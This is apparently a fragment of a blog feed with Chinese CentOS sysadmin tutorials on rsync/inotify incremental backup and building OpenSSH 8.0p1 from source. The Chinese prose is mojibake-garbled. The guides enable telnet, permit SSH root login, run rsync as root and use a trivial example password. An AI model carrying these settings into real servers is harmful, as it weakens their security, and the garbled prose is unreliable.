-y</span><br></pre></td></tr></table></figure><p>è¿˜è¦å¢åŠ ä¸€ä¸ªé…ç½®æ–‡ä»¶ (è¿™ä¸ªé…ç½®æ–‡ä»¶åœ¨CentOS7ä¸‹ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬æ‰‹åŠ¨åˆ›å»º)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/xinetd.d/rsync</span><br></pre></td></tr></table></figure><p>å†…å®¹å¦‚ä¸‹</p><pre><code># default: off# description: The rsync server is a good addition to an ftp server, as it \#       allows crc checksumming etc.service rsync&#123;        disable = no        flags           = IPv6        socket_type     = stream        wait            = no        user            = root        server          = /usr/bin/rsync        server_args     = --daemon        log_on_failure  += USERID&#125;</code></pre><p>æ˜¯ <a href="https://blog.csdn.net/bwlab/article/details/50556159">ä»è¿™é‡Œ</a> æ‰¾æ»´ï¼Œäº²æµ‹å¯ç”¨</p><h4 id="æ¥ä¸‹æ¥æ˜¯-è´Ÿè´£å¤‡ä»½çš„æœåŠ¡å™¨-çš„äº‹æƒ…äº†"><a href="#æ¥ä¸‹æ¥æ˜¯-è´Ÿè´£å¤‡ä»½çš„æœåŠ¡å™¨-çš„äº‹æƒ…äº†" class="headerlink" title="æ¥ä¸‹æ¥æ˜¯ è´Ÿè´£å¤‡ä»½çš„æœåŠ¡å™¨ çš„äº‹æƒ…äº†"></a>æ¥ä¸‹æ¥æ˜¯ è´Ÿè´£å¤‡ä»½çš„æœåŠ¡å™¨ çš„äº‹æƒ…äº†</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsyncd.conf</span><br></pre></td></tr></table></figure><p>æ·»åŠ ä»¥ä¸‹å†…å®¹</p><pre><code>log file = /var/log/rsyncd.logpidfile = /var/run/rsyncd.pidlock file = /var/run/rsync.locksecrets file = /etc/rsync.passmotd file = /etc/rsyncd.Motd#æ¨¡å—åç§°[test]#ä½ æƒ³å¤‡ä»½åœ¨æœ¬æœåŠ¡å™¨å“ªä¸ªè·¯å¾„å°±å¡«å‘—path = /home/test#æè¿°éšä¾¿åŠ comment = just a testuid = 0gid = 0port = 873use chroot = noread only = nolist = nomax connections = 200timeout = 600#è®¤è¯ç”¨æˆ·åï¼Œå¯ä»¥éšä¾¿å–auth users = test_user#ä¸»æœåŠ¡å™¨IPåœ°å€hosts allow = ä½ çš„ipåœ°å€</code></pre><p>è®¤è¯ç”¨æˆ·å’Œå¯†ç æ–‡ä»¶ï¼Œç³»ç»ŸåŸæœ¬æ²¡æœ‰ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºçš„å–”ã€‚<br>è¯¥æ–‡ä»¶åå­—å¯ä»¥éšæ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsync.pass</span><br></pre></td></tr></table></figure><p>é‡Œé¢æ˜¯å†…å®¹æ˜¯ é”®å€¼å¯¹</p><pre><code>test_user:testpass</code></pre><p>è¿™é‡Œæ³¨æ„å•¦ï¼Œå¿…é¡»æ˜¯æƒé™å¿…é¡»æ˜¯ 600 å–”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/rsyncd.conf &amp;&amp;</span><br><span class="line">chmod 600 /etc/rsync.pass &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ rsync æœ‰äº›éœ€è¦æœ‰äº›ä¸éœ€è¦ï¼Œ å¯èƒ½æ˜¯é˜²ç«å¢™åŸå› é˜»æ‹¦äº†å…¶ä»–ç«¯å£â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --daemon --config&#x3D;&#x2F;etc&#x2F;rsyncd.conf --port&#x3D;873</span><br></pre></td></tr></table></figure><h4 id="æ¥ä¸‹æ¥åˆ°-ä¸»æœåŠ¡å™¨-çš„äº‹æƒ…äº†"><a href="#æ¥ä¸‹æ¥åˆ°-ä¸»æœåŠ¡å™¨-çš„äº‹æƒ…äº†" class="headerlink" title="æ¥ä¸‹æ¥åˆ° ä¸»æœåŠ¡å™¨ çš„äº‹æƒ…äº†"></a>æ¥ä¸‹æ¥åˆ° ä¸»æœåŠ¡å™¨ çš„äº‹æƒ…äº†</h4><p>é¦–å…ˆåˆ›å»ºå¯†ç æ–‡ä»¶ï¼Œæ–‡ä»¶åå­—ä¹Ÿæ˜¯å¯ä»¥éšæ„å–”ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd.rsync</span><br></pre></td></tr></table></figure><p>å†…å®¹æ³¨æ„å•¦</p><pre><code>testpass</code></pre><p>æ˜¯ åˆšåˆšå¤‡ä»½æœåŠ¡å™¨ /etc/rsync.pass ç›®å½•ä¸‹è®¤è¯ç”¨æˆ·çš„å¯†ç å–”ï¼Œåªéœ€å¡«ä¸Šé¢çº¢å­—çš„å†…å®¹å°±OKå•¦</p><p>è¿™é‡Œæƒé™ä¹Ÿè¦æ³¨æ„ï¼Œå¿…é¡»æ˜¯ 600 å–”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/passwd.rsync &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>å…ˆå®‰è£…é¢„ç¼–è¯‘æ‰€éœ€è¦çš„å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install make gcc gcc-c++ -y</span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹è½½å’Œå®‰è£…inotify-tools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src &amp;&amp;</span><br><span class="line">wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line">tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line"><span class="built_in">cd</span> inotify-tools-3.14 &amp;&amp;</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/inotify &amp;&amp;</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>é…ç½®ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=/usr/local/inotify/bin:<span class="variable">$PATH</span>&quot;</span> &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/local/inotify/lib&quot;</span> &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/inotify/include /usr/include/inotify</span><br></pre></td></tr></table></figure><p>é…ç½®å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>æ³¨é‡Šåé¢æ·»åŠ </p><pre><code>fs.inotify.max_queued_events=99999999fs.inotify.max_user_watches=99999999fs.inotify.max_user_instances=65535</code></pre><p>åˆ›å»ºæ’é™¤ç›®å½•åˆ—è¡¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/exclude.list</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ’é™¤ç›®å½•ï¼Œè¿™é‡Œå¯ä»¥æ·»åŠ ä¸åŒæ­¥çš„ç›®å½•ï¼Œä¸€è¡Œä¸€ä¸ªç›®å½•ã€‚å¦‚æœæš‚æ—¶æ²¡æœ‰å¯ä»¥ç•™ç©ºï¼Œä»¥åéœ€è¦ç”¨åˆ°åœ¨æ·»åŠ ã€‚</p><p>å¦‚æœ uploads ç›®å½•æ˜¯æŒ‚è½½ç›®å½•å¯ä»¥æ’é™¤æ‰</p><pre><code>    wp-content/uploads/</code></pre><p>å¢é‡å¤‡ä»½è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#ä¸»æœåŠ¡å™¨éœ€è¦å¤‡ä»½çš„ç›®å½•</span></span><br><span class="line">srcdir=/home/<span class="built_in">test</span></span><br><span class="line"><span class="comment">#æ¨¡å—åç§°</span></span><br><span class="line">dstdir=<span class="built_in">test</span></span><br><span class="line">excludedir=/usr/<span class="built_in">local</span>/inotify/exclude.list</span><br><span class="line"><span class="comment">#è®¤è¯åç§°</span></span><br><span class="line">rsyncuser=test_user</span><br><span class="line"><span class="comment">#æœ¬æœºå­˜å¯†ç çš„ç›®å½•</span></span><br><span class="line">rsyncpassdir=/etc/passwd.rsync</span><br><span class="line"><span class="comment">#å¤‡ä»½æœåŠ¡å™¨çš„IPåœ°å€</span></span><br><span class="line">dstip=<span class="string">&quot;å¤‡ä»½æœåŠ¡å™¨æ»´IPåœ°å€&quot;</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">/usr/<span class="built_in">local</span>/inotify/bin/inotifywait -mrq --timefmt <span class="string">&#x27;%d/%m/%y %H:%M&#x27;</span> --format <span class="string">&#x27;%T %w%f%e&#x27;</span> -e close_write,modify,delete,create,attrib,move <span class="variable">$srcdir</span> | <span class="keyword">while</span> <span class="built_in">read</span> file</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; <span class="variable">$&#123;file&#125;</span> was rsynced&quot;</span> &gt;&gt; /tmp/rsync.log 2&gt;&amp;1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>è„šæœ¬å¯æ‰§è¡Œæƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><p>æ·»åŠ å¼€æœºå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>å¼€æœºå¯åŠ¨æ–‡ä»¶ä¸­æœ€åä¸€è¡Œæ·»åŠ </p><pre><code>sh /usr/local/inotify/rsync.sh &amp;</code></pre><h3 id="é€šè¿‡äº’æ¢-ip-è¿ç§»æœåŠ¡å™¨"><a href="#é€šè¿‡äº’æ¢-ip-è¿ç§»æœåŠ¡å™¨" class="headerlink" title="é€šè¿‡äº’æ¢ ip è¿ç§»æœåŠ¡å™¨"></a>é€šè¿‡äº’æ¢ ip è¿ç§»æœåŠ¡å™¨</h3><p>Centosé‡å¯ç½‘ç»œé…ç½®æ–‡ä»¶ä¼šå¯¼è‡´ /etc/resolv.conf è¢«è¦†ç›–æˆ–æ¸…ç©º è¿›è€Œå¯¼è‡´ yum æ— æ³•ä½¿ç”¨</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install_OpenSSH8.0p1_from_source</title>
      <link href="2019/07/14/Install-OpenSSH8-0p1-from-source/"/>
      <url>2019/07/14/Install-OpenSSH8-0p1-from-source/</url>
      
        <content type="html"><![CDATA[<h3 id="ç³»ç»Ÿç¯å¢ƒ-CentOS-7-x86-64-Minimal-1511"><a href="#ç³»ç»Ÿç¯å¢ƒ-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511"></a>ç³»ç»Ÿç¯å¢ƒ: CentOS-7-x86_64-Minimal-1511</h3><h3 id="rootç”¨æˆ·-å¤‡ä»½-ä¸‹è½½åŒ…-æ ¡éªŒåŒ…-ä¸€æ°”å‘µæˆ"><a href="#rootç”¨æˆ·-å¤‡ä»½-ä¸‹è½½åŒ…-æ ¡éªŒåŒ…-ä¸€æ°”å‘µæˆ" class="headerlink" title="rootç”¨æˆ·+å¤‡ä»½+ä¸‹è½½åŒ…+æ ¡éªŒåŒ… ä¸€æ°”å‘µæˆ"></a>rootç”¨æˆ·+å¤‡ä»½+ä¸‹è½½åŒ…+æ ¡éªŒåŒ… ä¸€æ°”å‘µæˆ</h3><h4 id="Package-Information-åŒ…çš„ç›¸å…³ä¿¡æ¯"><a href="#Package-Information-åŒ…çš„ç›¸å…³ä¿¡æ¯" class="headerlink" title="Package Information (åŒ…çš„ç›¸å…³ä¿¡æ¯)"></a>Package Information (åŒ…çš„ç›¸å…³ä¿¡æ¯)</h4><ul><li><p>Download (HTTP): <a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz</a></p></li><li><p>Download MD5 sum: bf050f002fe510e1daecd39044e1122d</p></li><li><p>Download size: 1.5 MB</p></li><li><p>Estimated disk space required: 45 MB (add 12 MB for tests)</p></li><li><p>Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed)</p></li></ul><h3 id="è™½ç„¶æ²¡å‡ºè¿‡äº‹-ä½†è¿˜æ˜¯è¦ç•™æ¡é€€è·¯"><a href="#è™½ç„¶æ²¡å‡ºè¿‡äº‹-ä½†è¿˜æ˜¯è¦ç•™æ¡é€€è·¯" class="headerlink" title="è™½ç„¶æ²¡å‡ºè¿‡äº‹, ä½†è¿˜æ˜¯è¦ç•™æ¡é€€è·¯"></a>è™½ç„¶æ²¡å‡ºè¿‡äº‹, ä½†è¿˜æ˜¯è¦ç•™æ¡é€€è·¯</h3><p>å®‰è£… telnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install telnet-server.x86_64 &amp;&amp;</span><br><span class="line">yum -y install telnet.x86_64</span><br></pre></td></tr></table></figure><p>å®‰è£… xinetd (æä¾›è®¿é—®å’Œæ—¥å¿—ç®¡ç†ç­‰åŠŸèƒ½)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd.x86_64</span><br></pre></td></tr></table></figure><p>å¼€å¯æœåŠ¡ &amp;&amp; å¼€æœºå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start xinetd &amp;&amp;</span><br><span class="line">systemctl start telnet.socket &amp;&amp;</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> telnet.socket &amp;&amp;</span><br><span class="line">systemctl <span class="built_in">enable</span> xinetd.service </span><br></pre></td></tr></table></figure><h3 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h3><p>å¦‚æœç›´æ¥ä¸Šå¯èƒ½å‡ºç°ä»¥ä¸‹ 4 ä¸ªé—®é¢˜:</p><h4 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h4><pre><code>checking for cc... nochecking for gcc... noconfigure: error: in \`/root/openssh-8.0p1&#39;:configure: error: no acceptable C compiler found in $PATHSee \`config.log&#39; for more details</code></pre><p>ç¼ºå°‘ cc å’Œ gcc ç¼–è¯‘å™¨, è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install cc gcc</span><br></pre></td></tr></table></figure><h4 id="äºŒ"><a href="#äºŒ" class="headerlink" title="äºŒ"></a>äºŒ</h4><pre><code>checking for zlib.h... noconfigure: error: *** zlib.h missing - please install first or check config.log ***</code></pre><p>ç¼ºå°‘ zlib-devel ç¯å¢ƒ, è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install zlib-devel</span><br></pre></td></tr></table></figure><h4 id="ä¸‰"><a href="#ä¸‰" class="headerlink" title="ä¸‰"></a>ä¸‰</h4><pre><code>configure: error: *** working libcrypto not found, check config.log</code></pre><p>libcrypto æœ‰ç‚¹çœ¼ç†Ÿâ€¦<br>è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssl-devel</span><br></pre></td></tr></table></figure><h4 id="å››"><a href="#å››" class="headerlink" title="å››"></a>å››</h4><pre><code>configure: error: PAM headers not found</code></pre><p>ç¼ºå°‘pam-develç¯å¢ƒ, è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install pam-devel</span><br></pre></td></tr></table></figure><p>è®¾ç½®é€‚å½“çš„ç¯å¢ƒä»¥ç”¨äºå…¶ä»–å®‰è£…æ­¥éª¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">install  -v -m700 -d /var/lib/sshd &amp;&amp;</span><br><span class="line">chown    -v root:sys /var/lib/sshd &amp;&amp;</span><br><span class="line"></span><br><span class="line">groupadd -g 50 sshd        &amp;&amp;</span><br><span class="line">useradd  -c <span class="string">&#x27;sshd PrivSep&#x27;</span> \</span><br><span class="line">         -d /var/lib/sshd  \</span><br><span class="line">         -g sshd           \</span><br><span class="line">         -s /bin/<span class="literal">false</span>     \</span><br><span class="line">         -u 50 sshd</span><br></pre></td></tr></table></figure><p>å®‰è£…å®˜ç½‘çš„ç¼–è¯‘åº”è¯¥æœ¨å¾—é—®é¢˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr                     \</span><br><span class="line">            --sysconfdir=/etc/ssh             \</span><br><span class="line">            --with-md5-passwords              \</span><br><span class="line">            --with-pam  \</span><br><span class="line">            --with-privsep-path=/var/lib/sshd</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘å¹¶æµ‹è¯•ä¸‹"><a href="#ç¼–è¯‘å¹¶æµ‹è¯•ä¸‹" class="headerlink" title="ç¼–è¯‘å¹¶æµ‹è¯•ä¸‹"></a>ç¼–è¯‘å¹¶æµ‹è¯•ä¸‹</h3><p>make &amp;&amp; make test</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">make install &amp;&amp;</span><br><span class="line">install -v -m755    contrib/ssh-copy-id /usr/bin     &amp;&amp;</span><br><span class="line"></span><br><span class="line">install -v -m644    contrib/ssh-copy-id.1 \</span><br><span class="line">                    /usr/share/man/man1              &amp;&amp;</span><br><span class="line">install -v -m755 -d /usr/share/doc/openssh-8.0p1     &amp;&amp;</span><br><span class="line">install -v -m644    INSTALL LICENCE OVERVIEW README* \</span><br><span class="line">                    /usr/share/doc/openssh-8.0p1</span><br></pre></td></tr></table></figure><h4 id="é‡åˆ°çš„ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯"><a href="#é‡åˆ°çš„ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯" class="headerlink" title="é‡åˆ°çš„ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯"></a>é‡åˆ°çš„ä¸¤ä¸ªé”™è¯¯ä¿¡æ¯</h4><h4 id="ä¸€-1"><a href="#ä¸€-1" class="headerlink" title="ä¸€"></a>ä¸€</h4><pre><code>/etc/ssh/sshd_config line 79: Unsupported option GSSAPIAuthentication/etc/ssh/sshd_config line 80: Unsupported option GSSAPICleanupCredentials</code></pre><p>æ³¨é‡Šæ‰è¿™ä¸¤è¡Œå°±å¥½å•¦, è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^GSSAPICleanupCredentials/s/GSSAPICleanupCredentials yes/#GSSAPICleanupCredentials yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication yes/#GSSAPIAuthentication yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^GSSAPIAuthentication/s/GSSAPIAuthentication no/#GSSAPIAuthentication no/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h4 id="äºŒ-1"><a href="#äºŒ-1" class="headerlink" title="äºŒ"></a>äºŒ</h4><pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_rsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_rsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_rsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ecdsa_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ecdsa_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ecdsa_key@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0640 for &#39;/etc/ssh/ssh_host_ed25519_key&#39; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Unable to load host key &quot;/etc/ssh/ssh_host_ed25519_key&quot;: bad permissionsUnable to load host key: /etc/ssh/ssh_host_ed25519_keysshd: no hostkeys available -- exiting.make: [check-config] Error 1 (ignored)</code></pre><p>ä¸Šé¢ä¸‰ä¸ªæ–‡ä»¶çš„æƒé™é—®é¢˜, è§£å†³æ–¹æ³•:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/ssh/ssh_host_rsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ecdsa_key &amp;&amp;</span><br><span class="line">chmod 600 /etc/ssh/ssh_host_ed25519_key</span><br></pre></td></tr></table></figure><h4 id="ä¿®æ”¹é…ç½®æ–‡ä»¶-å…è®¸rootç™»å½•"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶-å…è®¸rootç™»å½•" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶,å…è®¸rootç™»å½•"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶,å…è®¸rootç™»å½•</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin no/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;</span><br><span class="line">sed -i <span class="string">&#x27;/^#PermitRootLogin/s/#PermitRootLogin yes/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><h3 id="sshd-å¼€æœºå¯åŠ¨"><a href="#sshd-å¼€æœºå¯åŠ¨" class="headerlink" title="sshd å¼€æœºå¯åŠ¨"></a>sshd å¼€æœºå¯åŠ¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰åˆ«å¿˜äº†å…³é—­ telnet å–”!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop xinetd &amp;&amp;</span><br><span class="line">systemctl stop telnet.socket &amp;&amp;</span><br></pre></td></tr></table></figure><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” END â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>]]></content>
      
      
      <categories>
          
          <category> è¿ç»´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS7_backup</title>
      <link href="2019/07/13/CentOS7-backup/"/>
      <url>2019/07/13/CentOS7-backup/</url>
      
